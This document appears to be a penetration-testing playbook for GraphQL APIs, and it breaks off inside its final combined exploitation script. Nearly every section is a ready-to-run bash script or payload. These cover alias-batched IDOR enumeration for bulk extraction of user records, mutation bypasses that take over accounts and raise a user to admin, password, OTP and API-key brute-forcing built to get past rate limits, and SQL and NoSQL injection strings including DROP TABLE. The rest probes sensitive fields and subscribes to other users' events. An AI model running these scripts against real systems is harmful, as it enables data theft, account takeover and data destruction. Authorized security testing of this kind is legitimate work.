================================================================================
TASK 69 Â· GRAPHQL EXPLOITATION & ACCESS CONTROL
================================================================================
Covers testing_toolkit.txt Phase 8 Step 27 (Part 3)
Access control bypass, IDOR, injection, and authentication attacks.

OBJECTIVE:
- Exploit alias-based IDOR for mass data extraction
- Test mutation authorization bypass
- Brute-force authentication via CrackQL
- Inject SQL/NoSQL through GraphQL arguments
- Test field-level authorization
- Abuse subscriptions for unauthorized access

================================================================================
INPUTS
================================================================================
outputs/graphql/endpoints.txt              â† GraphQL endpoints
outputs/graphql/introspection_raw.json     â† Full schema
outputs/graphql/queries_list.txt           â† Available queries
outputs/graphql/mutations_list.txt         â† Available mutations

================================================================================
OUTPUTS
================================================================================
outputs/graphql/
â”œâ”€â”€ idor_results.txt               â† IDOR/BOLA findings
â”œâ”€â”€ auth_bypass_results.txt        â† Authorization bypass findings
â”œâ”€â”€ injection_results.txt          â† SQL/NoSQL injection results
â”œâ”€â”€ crackql_results.txt            â† Auth brute-force results
â”œâ”€â”€ subscription_results.txt       â† Subscription abuse findings
â””â”€â”€ exploitation_log.txt           â† Full execution log

================================================================================
ğŸ§  GRAPHQL SECURITY FUNDAMENTALS ğŸ§ 
================================================================================

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
GraphQL Authorization Layers
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Layer              â”‚ What It Controls               â”‚ Common Weakness      â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ Endpoint Auth      â”‚ Access to /graphql             â”‚ Missing entirely     â”‚
â”‚ Operation Auth     â”‚ Which queries/mutations        â”‚ Only checks some     â”‚
â”‚ Object Auth        â”‚ Which records (IDOR)           â”‚ Missing ownership    â”‚
â”‚ Field Auth         â”‚ Which fields on object         â”‚ Exposes sensitive    â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

COMMON VULNERABILITIES:
- Queries accessible without auth
- Mutations lack authorization checks
- Object IDs not validated for ownership
- Sensitive fields exposed (password hashes, tokens)
- Subscriptions bypass auth entirely

================================================================================
PHASE 1: ALIAS-BASED IDOR ATTACKS
================================================================================

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
1.1 Understanding Alias IDOR
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# GraphQL aliases enable querying multiple objects in ONE request
# Perfect for mass IDOR exploitation

# Traditional REST IDOR: 1 request per ID
GET /api/users/1
GET /api/users/2
GET /api/users/3
# 1000 IDs = 1000 requests (easily rate limited)

# GraphQL IDOR: 1 request for ALL IDs
query {
  u1: user(id: 1) { email }
  u2: user(id: 2) { email }
  u3: user(id: 3) { email }
  # ... 1000 users in 1 request!
}

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
1.2 Basic IDOR Enumeration
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
#!/bin/bash
# graphql_idor_enum.sh

TARGET="$1"
START_ID=${2:-1}
END_ID=${3:-100}

echo "[*] GraphQL IDOR enumeration: IDs $START_ID to $END_ID"

# Build query with aliases
query="{"
for id in $(seq $START_ID $END_ID); do
    query+="u$id: user(id: $id) { id email name } "
done
query+="}"

# Execute
response=$(curl -s -X POST "$TARGET" \
    -H "Content-Type: application/json" \
    -d "{\"query\":\"$query\"}")

# Count successful extractions
success_count=$(echo "$response" | grep -o '"email"' | wc -l)
echo "[*] Extracted $success_count user records"

# Save results
echo "$response" | jq '.data | to_entries[] | select(.value != null) | .value' \
    > outputs/graphql/idor_results.txt

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
1.3 UUID/GUID IDOR
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# If IDs are UUIDs, enumerate known patterns or leaked IDs

# Common UUID sources:
# - Previous API responses
# - JWT tokens (user ID in payload)
# - URL parameters
# - HTML source (data attributes)

# Extract UUIDs from previous responses
grep -oP '[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}' \
    outputs/*.json | sort -u > uuid_list.txt

# Query with UUID aliases
query="{"
while read uuid; do
    safe_alias=$(echo "$uuid" | tr '-' '_')
    query+="u_$safe_alias: user(id: \\\"$uuid\\\") { id email } "
done < uuid_list.txt
query+="}"

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
1.4 IDOR on Nested Objects
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# IDOR through relationships

query {
  # Access user 1's private messages by querying their conversations
  user(id: 1) {
    conversations {
      id
      messages {
        content
        sender { email }
      }
    }
  }
}

# Or enumerate conversation IDs directly
query {
  c1: conversation(id: 1) { messages { content } }
  c2: conversation(id: 2) { messages { content } }
  c3: conversation(id: 3) { messages { content } }
}

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
1.5 Automated IDOR Scanner
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
#!/bin/bash
# graphql_idor_scanner.sh

TARGET="$1"
AUTH_HEADER="$2"  # Optional: "Authorization: Bearer token"

OUTPUT="outputs/graphql/idor_results.txt"
echo "GraphQL IDOR Scan Results" > "$OUTPUT"
echo "=========================" >> "$OUTPUT"

# Types to test (from schema analysis)
TYPES=("user" "order" "document" "message" "account" "profile")

for type in "${TYPES[@]}"; do
    echo "[*] Testing $type..."
    
    # Try sequential IDs
    query="{"
    for id in $(seq 1 50); do
        query+="t$id: $type(id: $id) { id } "
    done
    query+="}"
    
    response=$(curl -s -X POST "$TARGET" \
        -H "Content-Type: application/json" \
        -H "$AUTH_HEADER" \
        -d "{\"query\":\"$query\"}")
    
    # Count accessible objects
    accessible=$(echo "$response" | jq '[.data | to_entries[] | select(.value != null)] | length')
    
    if [ "$accessible" -gt 0 ]; then
        echo "[!] $type: $accessible objects accessible!"
        echo "$type: $accessible accessible" >> "$OUTPUT"
    fi
done

================================================================================
PHASE 2: MUTATION AUTHORIZATION BYPASS
================================================================================

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
2.1 Identify Sensitive Mutations
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# From introspection, find dangerous mutations

cat outputs/graphql/introspection_raw.json | jq '
    .data.__schema.mutationType.name as $mutType |
    .data.__schema.types[] |
    select(.name == $mutType) |
    .fields[] |
    select(.name | test("delete|update|create|add|remove|admin|role|password|transfer"; "i")) |
    {name: .name, args: [.args[].name]}
'

# High-value mutations:
# - updateUser, deleteUser
# - updateRole, assignRole
# - transferFunds, createPayment
# - deleteAccount, resetPassword

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
2.2 Test Mutation Without Auth
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Try mutations without authentication

# Update another user (BOLA)
curl -s -X POST "https://target.com/graphql" \
    -H "Content-Type: application/json" \
    -d '{
        "query": "mutation { updateUser(id: 1, input: {email: \"attacker@evil.com\"}) { id email } }"
    }'

# Delete resource
curl -s -X POST "https://target.com/graphql" \
    -H "Content-Type: application/json" \
    -d '{
        "query": "mutation { deletePost(id: 123) { success } }"
    }'

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
2.3 Horizontal Privilege Escalation
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Access other users' data with your auth token

# User A's token, trying to update User B
curl -s -X POST "https://target.com/graphql" \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer USER_A_TOKEN" \
    -d '{
        "query": "mutation { updateUser(id: USER_B_ID, input: {name: \"Pwned\"}) { id } }"
    }'

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
2.4 Vertical Privilege Escalation
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Try admin-only mutations as regular user

# Role manipulation
mutation {
  updateUser(id: MY_ID, input: {role: "ADMIN"}) { id role }
}

# Or via relationship
mutation {
  assignRole(userId: MY_ID, roleId: 1) { success }  # roleId 1 = admin?
}

# Mass assignment in mutations
mutation {
  updateProfile(input: {
    name: "Normal Update",
    isAdmin: true,           # Hidden field
    role: "admin",           # Hidden field
    verified: true,          # Hidden field
    balance: 999999          # Hidden field
  }) {
    id
  }
}

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
2.5 Mutation Testing Script
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
#!/bin/bash
# test_mutation_auth.sh

TARGET="$1"
USER_TOKEN="$2"
VICTIM_ID="$3"

echo "[*] Testing mutation authorization"

# Test mutations that should fail
MUTATIONS=(
    "updateUser(id: $VICTIM_ID, input: {name: \"Test\"}) { id }"
    "deleteUser(id: $VICTIM_ID) { success }"
    "transferFunds(from: $VICTIM_ID, to: 999, amount: 100) { id }"
    "resetPassword(userId: $VICTIM_ID) { success }"
)

for mutation in "${MUTATIONS[@]}"; do
    echo "[*] Testing: $mutation"
    
    response=$(curl -s -X POST "$TARGET" \
        -H "Content-Type: application/json" \
        -H "Authorization: Bearer $USER_TOKEN" \
        -d "{\"query\":\"mutation { $mutation }\"}")
    
    if echo "$response" | grep -qi "error\|unauthorized\|forbidden\|denied"; then
        echo "    [+] Properly blocked"
    else
        echo "    [!] VULNERABLE - Mutation succeeded!"
        echo "$mutation" >> outputs/graphql/auth_bypass_results.txt
    fi
done

================================================================================
PHASE 3: CRACKQL - AUTHENTICATION ATTACKS
================================================================================

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
3.1 Understanding CrackQL
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# CrackQL: GraphQL password brute-forcing tool
# Exploits batching/aliases to bypass rate limits

# Instead of:
# 1 request = 1 login attempt (rate limited)

# CrackQL does:
# 1 request = 1000 login attempts (via aliases)

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
3.2 Install and Run CrackQL
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Install CrackQL
pip install crackql

# Basic usage
crackql -t https://target.com/graphql \
    -q 'mutation { login(email: "victim@target.com", password: "{{password}}") { token } }' \
    -w /path/to/wordlist.txt

# With batch size
crackql -t https://target.com/graphql \
    -q 'mutation { login(email: "{{username}}", password: "{{password}}") { token } }' \
    -u usernames.txt \
    -w passwords.txt \
    -b 100  # 100 attempts per request

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
3.3 Manual Batch Login Attack
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
#!/bin/bash
# graphql_batch_login.sh

TARGET="$1"
EMAIL="$2"
WORDLIST="$3"

echo "[*] Batch login attack against $EMAIL"

# Read passwords into array
passwords=()
while IFS= read -r pass; do
    passwords+=("$pass")
done < "$WORDLIST"

# Build batched mutation
query="mutation {"
i=1
for pass in "${passwords[@]:0:100}"; do  # First 100
    # Escape special characters
    safe_pass=$(echo "$pass" | sed 's/"/\\"/g')
    query+="a$i: login(email: \\\"$EMAIL\\\", password: \\\"$safe_pass\\\") { token } "
    ((i++))
done
query+="}"

# Execute
response=$(curl -s -X POST "$TARGET" \
    -H "Content-Type: application/json" \
    -d "{\"query\":\"$query\"}")

# Check for successful login (non-null token)
if echo "$response" | grep -q '"token":'; then
    echo "[!] Potential valid credentials found!"
    echo "$response" | jq '.data | to_entries[] | select(.value.token != null)'
fi

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
3.4 OTP/2FA Brute-Force via GraphQL
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Same technique for OTP codes

query="mutation {"
for code in $(seq -w 000000 001000); do  # First 1000 codes
    query+="c$code: verifyOtp(code: \\\"$code\\\") { success } "
done
query+="}"

# 1000 OTP attempts in single request!

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
3.5 Token/API Key Brute-Force
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Brute-force API keys or tokens

query="{"
for i in $(seq 1 100); do
    token="api_key_$i"
    query+="t$i: validateToken(token: \\\"$token\\\") { valid } "
done
query+="}"

================================================================================
PHASE 4: INJECTION ATTACKS
================================================================================

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
4.1 SQL Injection via Arguments
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# GraphQL arguments passed to backend queries

# Basic SQLi test
query {
  user(id: "1' OR '1'='1") { id email }
}

query {
  users(filter: "name LIKE '%admin%'--") { id }
}

# Time-based blind
query {
  user(id: "1' AND SLEEP(5)--") { id }
}

# Union-based
query {
  search(term: "' UNION SELECT username,password FROM users--") { 
    results 
  }
}

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
4.2 NoSQL Injection
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# MongoDB injection via GraphQL

# Operator injection
query {
  user(filter: {email: {$ne: ""}}) { id email }
}

# Regex injection
query {
  users(filter: {password: {$regex: "^a"}}) { id }
}

# $where injection
query {
  users(filter: {$where: "this.password.length > 0"}) { id email }
}

# JSON injection in string args
query {
  user(id: "{\"$gt\": \"\"}") { id email }
}

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
4.3 Injection Testing Script
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
#!/bin/bash
# graphql_injection_test.sh

TARGET="$1"

echo "[*] Testing GraphQL injection vectors"

# SQL injection payloads
SQL_PAYLOADS=(
    "1' OR '1'='1"
    "1' OR '1'='1'--"
    "1; DROP TABLE users--"
    "1' AND SLEEP(5)--"
    "1' UNION SELECT NULL--"
)

# NoSQL payloads
NOSQL_PAYLOADS=(
    '{"$ne": ""}'
    '{"$gt": ""}'
    '{"$regex": ".*"}'
)

for payload in "${SQL_PAYLOADS[@]}"; do
    echo "[*] Testing SQL: $payload"
    
    # Escape for JSON
    escaped=$(echo "$payload" | sed 's/"/\\"/g')
    
    response=$(curl -s -X POST "$TARGET" \
        -H "Content-Type: application/json" \
        -d "{\"query\":\"{ user(id: \\\"$escaped\\\") { id } }\"}" \
        --max-time 10)
    
    # Check for SQL errors or success
    if echo "$response" | grep -qi "sql\|syntax\|mysql\|postgresql\|oracle"; then
        echo "    [!] SQL error detected!"
    elif echo "$response" | grep -qi "data.*user"; then
        echo "    [!] Query succeeded - potential injection!"
    fi
done

================================================================================
PHASE 5: FIELD-LEVEL AUTHORIZATION
================================================================================

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
5.1 Sensitive Field Enumeration
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# From schema, identify sensitive fields

SENSITIVE_FIELDS="password passwordHash token apiKey secret privateKey 
ssn creditCard cvv pin balance salary internalId adminNote"

# Test access to each
for field in $SENSITIVE_FIELDS; do
    echo "[*] Testing field: $field"
    
    response=$(curl -s -X POST "$TARGET" \
        -H "Content-Type: application/json" \
        -d "{\"query\":\"{ user(id: 1) { $field } }\"}")
    
    if ! echo "$response" | grep -qi "cannot query\|unauthorized\|forbidden"; then
        echo "    [!] Field accessible: $field"
    fi
done

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
5.2 Hidden Field Discovery
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# If introspection disabled, guess hidden fields

HIDDEN_FIELD_WORDLIST="
admin isAdmin is_admin
role roles userRole
password passwordHash hashedPassword
token accessToken refreshToken authToken
secret secretKey apiKey
internal internalId privateId
ssn socialSecurity taxId
balance accountBalance credits
verified isVerified emailVerified
banned isBanned suspended
permissions scopes privileges
createdAt updatedAt deletedAt
ipAddress lastIp loginIp
"

for field in $HIDDEN_FIELD_WORDLIST; do
    response=$(curl -s -X POST "$TARGET" \
        -H "Content-Type: application/json" \
        -d "{\"query\":\"{ me { $field } }\"}" 2>/dev/null)
    
    if echo "$response" | grep -q "\"$field\""; then
        echo "[+] Hidden field found: $field"
    fi
done

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
5.3 Field Authorization Bypass
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Try accessing restricted fields via different paths

# Direct access blocked
{ user(id: 1) { ssn } }  # Error: unauthorized

# Via relationship (might bypass)
{ 
  organization(id: 1) { 
    members { 
      ssn  # Might work through this path!
    } 
  } 
}

# Via nested query
{
  posts(authorId: 1) {
    author {
      ssn  # Different resolver, different auth?
    }
  }
}

================================================================================
PHASE 6: SUBSCRIPTION ATTACKS
================================================================================

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
6.1 Test Subscription Authentication
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Subscriptions use WebSocket - often have weaker auth

# Connect to subscription endpoint
websocat ws://target.com/graphql

# Send subscription
{"type":"start","id":"1","payload":{"query":"subscription { newMessage { id content sender { email } } }"}}

# Often auth checked only on initial connection, not per-subscription

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
6.2 Subscribe to Other Users' Events
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
# Try subscribing to events you shouldn't see

subscription {
  userActivity(userId: "VICTIM_ID") {
    action
    timestamp
    data
  }
}

subscription {
  orderUpdates(userId: "VICTIM_ID") {
    orderId
    status
    items
  }
}

â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
6.3 Subscription Enumeration
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
#!/bin/bash
# test_subscription_auth.sh

TARGET="$1"  # WebSocket URL
MY_ID="$2"
VICTIM_ID="$3"

# Test subscriptions for authorization
SUBSCRIPTIONS=(
    "userActivity(userId: \\\"$VICTIM_ID\\\")"
    "messageReceived(userId: \\\"$VICTIM_ID\\\")"
    "orderStatus(userId: \\\"$VICTIM_ID\\\")"
    "newNotification(userId: \\\"$VICTIM_ID\\\")"
)

for sub in "${SUBSCRIPTIONS[@]}"; do
    echo "[*] Testing: $sub"
    
    # Use websocat or similar
    echo "{\"type\":\"start\",\"id\":\"1\",\"payload\":{\"query\":\"subscription { $sub { id } }\"}}" | \
        timeout 5 websocat "$TARGET" 2>/dev/null
done

================================================================================
PHASE 7: COMPLETE EXPLOITATION SCRIPT
================================================================================

#!/bin/bash
# complete_graphql_exploitation.sh

TARGET="$1"
AUTH_TOKEN="$2"
OUTPUT_DIR="outputs/graphql"
mkdir -p "$OUTPUT_DIR"

echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
echo " GraphQL Exploitation & Access Control Testing"
echo " Target: $TARGET"
echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"

# TEST 1: IDOR via Aliases
echo ""
echo "[TEST 1] Alias-Based IDOR"
echo "â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€"

query="{"
for id in $(seq 1 50); do
    query+="u$id: user(id: $id) { id email name } "
done
query+="}"

response=$(curl -s -X POST "$TARGET" \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $AUTH_TOKEN" \
    -d "{\"query\":\"$query\"}")

accessible=$(echo "$response" | jq '[.data | to_entries[] | select(.value != null)] | length' 2>/dev/null)
echo "[*] Accessible users via IDOR: $accessible"
echo "IDOR: $accessible users accessible" >> "$OUTPUT_DIR/idor_results.txt"

# TEST 2: Sensitive Fields
echo ""
echo "[TEST 2] Sensitive Field Access"
echo "â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€"

FIELDS="password passwordHash token secret apiKey ssn balance role isAdmin"
for field in $FIELDS; do
    response=$(curl -s -X POST "$TARGET" \
        -H "Content-Type: application/json" \
        -H "Authorization: Bearer $AUTH_TOKEN" \
